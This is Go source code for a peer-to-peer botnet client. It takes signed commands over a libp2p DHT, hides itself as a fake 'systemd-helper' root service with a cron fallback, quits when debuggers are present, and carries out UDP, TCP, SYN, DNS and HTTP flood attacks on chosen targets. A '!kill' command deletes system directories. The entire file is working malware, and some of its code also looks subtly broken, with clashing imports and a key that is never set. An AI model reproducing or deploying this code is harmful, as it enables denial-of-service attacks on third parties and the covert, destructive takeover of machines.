package main

import (
	"bytes"
	"context"
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/libp2p/go-libp2p"
	dht "github.com/libp2p/go-libp2p-kad-dht"
	"github.com/libp2p/go-libp2p/core/crypto"
	"github.com/libp2p/go-libp2p/core/host"
	"github.com/libp2p/go-libp2p/core/network"
	"github.com/libp2p/go-libp2p/core/peer"
	"github.com/libp2p/go-libp2p/core/protocol"
	"github.com/miekg/dns"
)

const (
	replayCacheTTL       = 10 * time.Minute
	replayCacheCleanup   = 1 * time.Hour
	persistenceDir       = "/var/lib/.systemd-helper"
	servicePath          = "/etc/systemd/system/systemd-helper.service"
	peerKeyFile          = "/var/lib/.systemd-helper/peer.key"
	statusUpdateInterval = 5 * time.Minute
	commandFetchInterval = 10 * time.Second
	numWorkers           = 2024
	maxPacketSize        = 65507
)

var (
	bootstrapPeers = []string{
		"/ip4/104.131.131.82/tcp/4001/p2p/QmaCpDMGvV2BGHeYERUEnRQAwe3N8SzbUtfsmvsqQLuvuJ",
		"/ip4/104.131.131.82/udp/4001/quic-v1/p2p/QmaCpDMGvV2BGHeYERUEnRQAwe3N8SzbUtfsmvsqQLuvuJ",
	}
	publicKey     *rsa.PublicKey
	startTime     = time.Now()
	attackCounter int64
	replayCache   = struct {
		sync.RWMutex
		entries map[string]time.Time
	}{entries: make(map[string]time.Time)}
)

type Command struct {
	Command   string `json:"command"`
	Timestamp int64  `json:"timestamp"`
	Signature []byte `json:"signature"`
	TTL       int    `json:"ttl"`
}

type P2PNode struct {
	Host   host.Host
	DHT    *dht.IpfsDHT
	Ctx    context.Context
	Cancel context.CancelFunc
}

type BotNode struct {
	P2PNode
	LastCommandTime time.Time
}

func NewP2PNode() (*P2PNode, error) {
	ctx, cancel := context.WithCancel(context.Background())
	priv, err := loadOrGenerateKey()
	if err != nil {
		cancel()
		return nil, fmt.Errorf("failed to load/generate key: %w", err)
	}

	h, err := libp2p.New(
		libp2p.Identity(priv),
		libp2p.NATPortMap(),
		libp2p.EnableRelay(),
		libp2p.EnableAutoRelay(),
	)
	if err != nil {
		cancel()
		return nil, fmt.Errorf("failed to create host: %w", err)
	}

	kadDHT, err := dht.New(ctx, h, dht.Mode(dht.ModeAutoServer))
	if err != nil {
		cancel()
		return nil, fmt.Errorf("failed to create DHT: %w", err)
	}

	if err = kadDHT.Bootstrap(ctx); err != nil {
		cancel()
		return nil, fmt.Errorf("failed to bootstrap DHT: %w", err)
	}

	return &P2PNode{
		Host:   h,
		DHT:    kadDHT,
		Ctx:    ctx,
		Cancel: cancel,
	}, nil
}

func loadOrGenerateKey() (crypto.PrivKey, error) {
	if _, err := os.Stat(peerKeyFile); err == nil {
		keyBytes, err := os.ReadFile(peerKeyFile)
		if err != nil {
			return nil, fmt.Errorf("failed to read key file: %w", err)
		}
		return crypto.UnmarshalPrivateKey(keyBytes)
	}

	priv, _, err := crypto.GenerateKeyPair(crypto.RSA, 2048)
	if err != nil {
		return nil, fmt.Errorf("failed to generate key pair: %w", err)
	}

	keyBytes, err := crypto.MarshalPrivateKey(priv)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal private key: %w", err)
	}

	if err := os.MkdirAll(persistenceDir, 0700); err != nil {
		return nil, fmt.Errorf("failed to create persistence dir: %w", err)
	}

	if err := os.WriteFile(peerKeyFile, keyBytes, 0600); err != nil {
		return nil, fmt.Errorf("failed to write key file: %w", err)
	}

	return priv, nil
}

func (n *P2PNode) ConnectToBootstrapPeers() {
	var wg sync.WaitGroup
	for _, peerAddr := range bootstrapPeers {
		wg.Add(1)
		go func(addr string) {
			defer wg.Done()
			peerInfo, err := peer.AddrInfoFromString(addr)
			if err != nil {
				return
			}
			if err := n.Host.Connect(n.Ctx, *peerInfo); err != nil {
				return
			}
		}(peerAddr)
	}
	wg.Wait()
}

func (n *P2PNode) StartCommandListener() {
	n.Host.SetStreamHandler(protocol.ID("/botnet/command/1.0.0"), func(s network.Stream) {
		defer s.Close()
		var cmd Command
		if err := json.NewDecoder(s).Decode(&cmd); err != nil {
			return
		}
		if !cmd.VerifySignature() || isReplayAttack(cmd) {
			return
		}
		go handleCommand(cmd.Command)
	})
}

func (c *Command) VerifySignature() bool {
	if time.Now().Unix() > c.Timestamp+int64(c.TTL) {
		return false
	}
	hashed := sha256.Sum256([]byte(c.Command + "|" + strconv.FormatInt(c.Timestamp, 10)))
	err := rsa.VerifyPKCS1v15(publicKey, crypto.SHA256, hashed[:], c.Signature)
	return err == nil
}

func isReplayAttack(cmd Command) bool {
	hash := sha256.Sum256([]byte(cmd.Command + "|" + strconv.FormatInt(cmd.Timestamp, 10)))
	hashStr := hex.EncodeToString(hash[:])

	replayCache.RLock()
	_, exists := replayCache.entries[hashStr]
	replayCache.RUnlock()

	if exists {
		return true
	}

	replayCache.Lock()
	replayCache.entries[hashStr] = time.Now()
	replayCache.Unlock()

	return false
}

func cleanupReplayCache() {
	ticker := time.NewTicker(replayCacheCleanup)
	defer ticker.Stop()
	for range ticker.C {
		replayCache.Lock()
		now := time.Now()
		for hash, timestamp := range replayCache.entries {
			if now.Sub(timestamp) > replayCacheTTL {
				delete(replayCache.entries, hash)
			}
		}
		replayCache.Unlock()
	}
}

func (b *BotNode) Start() error {
	b.ConnectToBootstrapPeers()
	b.StartCommandListener()
	go b.ReportStatus()
	go b.FetchCommands()
	go cleanupReplayCache()
	return nil
}

func (b *BotNode) ReportStatus() {
	ticker := time.NewTicker(statusUpdateInterval)
	defer ticker.Stop()
	for range ticker.C {
		status := map[string]interface{}{
			"peer_id":      b.Host.ID().String(),
			"uptime":       time.Since(startTime).Seconds(),
			"last_command": b.LastCommandTime,
			"attack_count": atomic.LoadInt64(&attackCounter),
			"connections":  len(b.Host.Network().Conns()),
			"dht_peers":    b.DHT.RoutingTable().Size(),
		}
		data, _ := json.Marshal(status)
		_ = b.DHT.PutValue(b.Ctx, "bot_stats_"+b.Host.ID().String(), data)
	}
}

func (b *BotNode) FetchCommands() {
	ticker := time.NewTicker(commandFetchInterval)
	defer ticker.Stop()
	for range ticker.C {
		val, err := b.DHT.GetValue(b.Ctx, "latest_attack_command")
		if err != nil {
			continue
		}
		var cmd Command
		if err := json.Unmarshal(val, &cmd); err != nil {
			continue
		}
		if cmd.VerifySignature() && !isReplayAttack(cmd) {
			b.LastCommandTime = time.Now()
			go handleCommand(cmd.Command)
		}
	}
}

func CheckDebuggers() {
	if status, err := os.ReadFile("/proc/self/status"); err == nil {
		if !strings.Contains(string(status), "TracerPid:\t0") {
			os.Exit(0)
		}
	}

	for _, tool := range []string{"gdb", "strace", "ltrace", "tcpdump", "wireshark"} {
		if err := exec.Command("pgrep", "-x", tool).Run(); err == nil {
			os.Exit(0)
		}
	}
}

func SetupPersistence() error {
	exePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("failed to get executable path: %w", err)
	}

	if err := os.MkdirAll(persistenceDir, 0755); err != nil {
		return fmt.Errorf("failed to create persistence dir: %w", err)
	}

	targetPath := filepath.Join(persistenceDir, ".systemd-process")
	if err := copyFile(exePath, targetPath); err != nil {
		return fmt.Errorf("failed to copy executable: %w", err)
	}

	serviceContent := fmt.Sprintf(`[Unit]
Description=System Helper Service
After=network.target
[Service]
ExecStart=%s
Restart=always
RestartSec=60
StandardOutput=null
StandardError=null
User=root
[Install]
WantedBy=multi-user.target`, targetPath)

	if err := os.WriteFile(servicePath, []byte(serviceContent), 0644); err != nil {
		return fmt.Errorf("failed to write service file: %w", err)
	}

	if err := exec.Command("systemctl", "daemon-reload").Run(); err != nil {
		return fmt.Errorf("failed to reload systemd: %w", err)
	}

	if err := exec.Command("systemctl", "enable", "--now", "systemd-helper.service").Run(); err != nil {
		return fmt.Errorf("failed to enable service: %w", err)
	}

	cronJob := fmt.Sprintf("@reboot %s", targetPath)
	cmd := exec.Command("bash", "-c", fmt.Sprintf("(crontab -l; echo '%s') | crontab -", cronJob))
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to set up cron job: %w", err)
	}

	return nil
}

func copyFile(src, dst string) error {
	input, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	return os.WriteFile(dst, input, 0755)
}

func handleCommand(cmd string) {
	fields := strings.Fields(cmd)
	if len(fields) == 0 {
		return
	}

	switch fields[0] {
	case "!udpflood":
		if len(fields) != 4 {
			return
		}
		go performUDPFlood(fields[1], fields[2], fields[3])
	case "!tcpflood":
		if len(fields) != 4 {
			return
		}
		go performTCPFlood(fields[1], fields[2], fields[3])
	case "!synflood":
		if len(fields) != 4 {
			return
		}
		go performSYNFlood(fields[1], fields[2], fields[3])
	case "!dns":
		if len(fields) != 4 {
			return
		}
		go performDNSFlood(fields[1], fields[2], fields[3])
	case "!http":
		if len(fields) != 4 {
			return
		}
		go performHTTPFlood(fields[1], fields[2], fields[3])
	case "!kill":
		go killerMaps()
	}
	atomic.AddInt64(&attackCounter, 1)
}

func performUDPFlood(targetIP, portStr, durationStr string) {
	port, _ := strconv.Atoi(portStr)
	duration, _ := strconv.Atoi(durationStr)
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	var packetCount int64
	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		return
	}

	payload := make([]byte, maxPacketSize)
	rand.Read(payload)

	var wg sync.WaitGroup
	worker := func() {
		defer wg.Done()
		for {
			select {
			case <-ctx.Done():
				return
			default:
				sourcePort := rand.Intn(65535-1024) + 1024
				conn, err := net.DialUDP("udp", &net.UDPAddr{Port: sourcePort}, &net.UDPAddr{IP: dstIP, Port: port})
				if err != nil {
					continue
				}
				_, err = conn.Write(payload)
				if err == nil {
					atomic.AddInt64(&packetCount, 1)
				}
				conn.Close()
			}
		}
	}

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go worker()
	}
	wg.Wait()
}

func performTCPFlood(targetIP, portStr, durationStr string) {
	port, _ := strconv.Atoi(portStr)
	duration, _ := strconv.Atoi(durationStr)
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	var packetCount int64
	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		return
	}

	var wg sync.WaitGroup
	worker := func() {
		defer wg.Done()
		conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
		if err != nil {
			return
		}
		defer conn.Close()

		payload := make([]byte, maxPacketSize-40)
		for {
			select {
			case <-ctx.Done():
				return
			default:
				tcpLayer := &layers.TCP{
					SrcPort:    layers.TCPPort(rand.Intn(52024) + 1024),
					DstPort:    layers.TCPPort(port),
					Seq:        rand.Uint32(),
					Window:     12800,
					SYN:        true,
					DataOffset: 5,
				}
				rand.Read(payload)
				buffer := gopacket.NewSerializeBuffer()
				if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer, gopacket.Payload(payload)); err != nil {
					continue
				}
				if _, err := conn.WriteTo(buffer.Bytes(), &net.IPAddr{IP: dstIP}); err != nil {
					continue
				}
				atomic.AddInt64(&packetCount, 1)
			}
		}
	}

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go worker()
	}
	wg.Wait()
}

func performSYNFlood(targetIP, portStr, durationStr string) {
	port, _ := strconv.Atoi(portStr)
	duration, _ := strconv.Atoi(durationStr)
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	var packetCount int64
	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		return
	}

	var wg sync.WaitGroup
	worker := func() {
		defer wg.Done()
		conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
		if err != nil {
			return
		}
		defer conn.Close()

		payload := make([]byte, maxPacketSize-40)
		for {
			select {
			case <-ctx.Done():
				return
			default:
				tcpLayer := &layers.TCP{
					SrcPort:    layers.TCPPort(rand.Intn(52024) + 1024),
					DstPort:    layers.TCPPort(port),
					Seq:        rand.Uint32(),
					Window:     12800,
					SYN:        true,
					DataOffset: 5,
				}
				rand.Read(payload)
				buffer := gopacket.NewSerializeBuffer()
				if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer, gopacket.Payload(payload)); err != nil {
					continue
				}
				if _, err := conn.WriteTo(buffer.Bytes(), &net.IPAddr{IP: dstIP}); err != nil {
					continue
				}
				atomic.AddInt64(&packetCount, 1)
			}
		}
	}

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go worker()
	}
	wg.Wait()
}

func performDNSFlood(targetIP, portStr, durationStr string) {
	port, _ := strconv.Atoi(portStr)
	duration, _ := strconv.Atoi(durationStr)
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	var packetCount int64
	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		return
	}

	domains := []string{"youtube.com", "google.com", "spotify.com", "netflix.com", "bing.com", "facebook.com", "amazon.com"}
	queryTypes := []uint16{dns.TypeA, dns.TypeAAAA, dns.TypeMX, dns.TypeNS}

	var wg sync.WaitGroup
	worker := func() {
		defer wg.Done()
		conn, err := net.ListenPacket("udp", ":0")
		if err != nil {
			return
		}
		defer conn.Close()

		for {
			select {
			case <-ctx.Done():
				return
			default:
				domain := domains[rand.Intn(len(domains))]
				queryType := queryTypes[rand.Intn(len(queryTypes))]
				dnsQuery := constructDNSQuery(domain, queryType)
				buffer, err := dnsQuery.Pack()
				if err != nil {
					continue
				}
				sourcePort := rand.Intn(65535-1024) + 1024
				_, err = conn.WriteTo(buffer, &net.UDPAddr{IP: dstIP, Port: port, Zone: fmt.Sprintf("%d", sourcePort)})
				if err != nil {
					continue
				}
				atomic.AddInt64(&packetCount, 1)
			}
		}
	}

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go worker()
	}
	wg.Wait()
}

func performHTTPFlood(targetIP, portStr, durationStr string) {
	port, _ := strconv.Atoi(portStr)
	duration, _ := strconv.Atoi(durationStr)
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	var requestCount int64
	resolvedIP, err := resolveTarget(targetIP)
	if err != nil {
		return
	}
	targetURL := fmt.Sprintf("http://%s:%d", resolvedIP, port)

	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/16.0 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
	}

	referers := []string{
		"https://www.google.com/",
		"https://www.example.com/",
		"https://www.wikipedia.org/",
	}

	var wg sync.WaitGroup
	worker := func() {
		defer wg.Done()
		client := &http.Client{
			Timeout: 5 * time.Second,
		}
		for {
			select {
			case <-ctx.Done():
				return
			default:
				body := make([]byte, 1024)
				rand.Read(body)
				req, err := http.NewRequest("POST", targetURL, bytes.NewReader(body))
				if err != nil {
					continue
				}
				req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
				req.Header.Set("Referer", referers[rand.Intn(len(referers))])
				req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
				req.Header.Set("Accept-Language", "en-US,en;q=0.5")
				resp, err := client.Do(req)
				if err != nil {
					continue
				}
				resp.Body.Close()
				atomic.AddInt64(&requestCount, 1)
			}
		}
	}

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go worker()
	}
	wg.Wait()
}

func resolveTarget(target string) (string, error) {
	if net.ParseIP(target) != nil {
		return target, nil
	}
	url := fmt.Sprintf("https://1.1.1.1/dns-query?name=%s&type=A", target)
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "", fmt.Errorf("failed to create DNS request: %w", err)
	}
	req.Header.Set("Accept", "application/dns-json")
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("failed to perform DNS lookup: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("DNS lookup failed with status: %d", resp.StatusCode)
	}
	var dnsResp struct {
		Answer []struct {
			Data string `json:"data"`
		} `json:"Answer"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&dnsResp); err != nil {
		return "", fmt.Errorf("failed to decode DNS response: %w", err)
	}
	if len(dnsResp.Answer) == 0 {
		return "", fmt.Errorf("no DNS records found")
	}
	return dnsResp.Answer[0].Data, nil
}

func constructDNSQuery(domain string, queryType uint16) *dns.Msg {
	msg := new(dns.Msg)
	msg.SetQuestion(dns.Fqdn(domain), queryType)
	msg.RecursionDesired = true
	edns0 := new(dns.OPT)
	edns0.Hdr.Name = "."
	edns0.Hdr.Rrtype = dns.TypeOPT
	edns0.SetUDPSize(4096)
	msg.Extra = append(msg.Extra, edns0)
	return msg
}

func killerMaps() {
	for _, dir := range []string{"/tmp", "/var/run", "/mnt", "/root", "/etc/config", "/data"} {
		os.RemoveAll(dir)
	}
}

func main() {
	node, err := NewP2PNode()
	if err != nil {
		fmt.Printf("Failed to create P2P node: %v\n", err)
		os.Exit(1)
	}
	defer node.Cancel()

	bot := &BotNode{P2PNode: *node}
	if err := bot.Start(); err != nil {
		fmt.Printf("Failed to start bot: %v\n", err)
		os.Exit(1)
	}

	go CheckDebuggers()
	if err := SetupPersistence(); err != nil {
		fmt.Printf("Failed to setup persistence: %v\n", err)
	}

	fmt.Printf("Bot started with ID: %s\n", node.Host.ID())

	select {}
}
